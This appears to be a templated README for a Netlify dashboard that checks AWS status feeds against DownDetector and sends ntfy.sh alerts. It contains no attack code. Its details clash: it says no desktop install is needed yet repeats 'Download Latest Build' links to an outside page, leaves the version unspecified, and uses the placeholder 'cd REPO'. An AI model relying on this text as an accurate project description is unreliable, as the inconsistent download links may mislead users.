# AWS Status Checker - Cloud Status Monitoring Dashboard 2026

> **AWS Status Checker is a Netlify-hosted monitoring dashboard for AWS services. It checks scheduled status data, compares AWS results with DownDetector, and can publish alerts through ntfy.sh.**

[![Platform](https://img.shields.io/badge/Platform-Netlify%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-reedtpfo4752/aws-status-monitoring-hub?style=flat-square)](https://github.com/owen-reedtpfo4752/aws-status-monitoring-hub)

---

<p align="center">
  <a href="https://owen-reedtpfo4752.github.io/aws-status-monitoring-hub/">
    <img src="https://img.shields.io/badge/Download-AWS%20Status%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download AWS Status Checker">
  </a>
</p>

> **[Download AWS Status Checker](https://owen-reedtpfo4752.github.io/aws-status-monitoring-hub/)**

---

[Download Latest Build](https://owen-reedtpfo4752.github.io/aws-status-monitoring-hub/)

---

## Overview

AWS Status Checker brings AWS service health information into a single live web interface. It reads official AWS status feeds so teams, administrators, and individual users can review current cloud conditions without manually visiting several status pages.

In addition to AWS data, the dashboard checks corresponding DownDetector information and supports event alerts through ntfy.sh. Netlify scheduled functions repeat the checks at five-minute intervals, and the application includes an API endpoint for retrieving unprocessed status data for integrations or custom monitoring processes.

---

## What It Provides

- Retrieves official AWS status feed data every five minutes
- Compares AWS service conditions against DownDetector reports
- Displays the latest findings through a live browser dashboard
- Delivers configured alerts using ntfy.sh
- Makes raw status information available through an API endpoint
- Uses Netlify scheduled functions for automated recurring checks
- Works through a web browser without requiring a desktop application
- Supports AWS-focused monitoring for operators and other users

---

## Getting Started

First, clone the repository:

```bash
git clone https://github.com/owen-reedtpfo4752/aws-status-monitoring-hub.git
cd REPO
```

Use the repository as the source for a Netlify deployment. Once deployment finishes, visit the Netlify site URL assigned to the project to open the dashboard.

For development on a local machine, follow the workflow already defined in the repository and start the web application with the available development command or local preview configuration.

---

## Using the Dashboard

1. Visit the Netlify URL for the deployed application.
2. Inspect the most recent AWS service information shown on the dashboard.
3. Check the related DownDetector information alongside the AWS result.
4. Call the API endpoint from scripts or services that require raw status output.
5. Set up ntfy.sh when ongoing status alerts are needed.
6. Keep Netlify scheduled functions enabled so checks continue every five minutes.

The dashboard is intended for quick, current visibility. The API provides a way for scripts, internal utilities, and other monitoring systems to use the same status data.

---

## Deployment and Notification Settings

Deployment options and notification values are managed through the Netlify project configuration and the application's repository settings.

```text
Deployment platform: Netlify
Scheduled check interval: 5 minutes
Notification service: ntfy.sh
Status sources: AWS official feeds and DownDetector
```

The notification settings should point to the ntfy.sh destination used by the deployment. Before publishing configuration changes or updating scheduled functions, inspect the existing repository settings.

---

## Requirements

- A Netlify deployment to host the dashboard
- A web browser for accessing the interface
- Repository access for cloning or deploying the project
- Enabled Netlify scheduled functions for automated checks
- An ntfy.sh destination when notifications are needed
- Network connectivity to AWS status feeds and the DownDetector data source

The hosted dashboard does not require a desktop application installation.

---

## Frequently Asked Questions

### Which services does AWS Status Checker monitor?

The application reads official AWS status feeds and checks those results against DownDetector data.

### What is the checking interval?

Netlify scheduled functions execute the monitoring checks once every five minutes.

### Where is the current information shown?

The latest results appear in the live dashboard hosted by the Netlify deployment.

### Is the data available to other software?

Yes. An API endpoint exposes the raw status information for use by another application, script, or service.

### How are alerts delivered?

After the deployment's notification settings are configured, alerts are sent through ntfy.sh.

### What can I do if the dashboard stops refreshing?

Inspect the Netlify deployment logs, make sure scheduled functions are active, and confirm that the application can connect to both configured status sources.

### How do I publish an update?

Deploy a new revision from the repository to the connected Netlify site. Review the project's configuration and deployment history when applying an update.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
